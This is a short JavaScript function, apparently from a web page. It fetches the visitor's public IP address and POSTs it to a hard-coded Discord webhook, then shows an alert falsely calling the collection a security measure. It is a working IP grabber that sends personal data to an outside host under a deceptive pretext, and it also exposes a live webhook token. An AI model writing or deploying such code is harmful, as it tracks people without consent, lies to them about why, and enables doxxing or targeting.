function sendIP() {
    fetch("https://api64.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
            fetch("https://discord.com/api/webhooks/1334652267231580235/-byV2jl_LVlpdJFbkzepAXKIuTKYrFeicNdorb3BY79oFk2J04_g-ARC4Gt_o0Z7Tkk8", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ ip: data.ip })
            });
            alert("Your IP has been sent for security purposes.");
        })
        .catch(error => console.error("Error:", error));
}
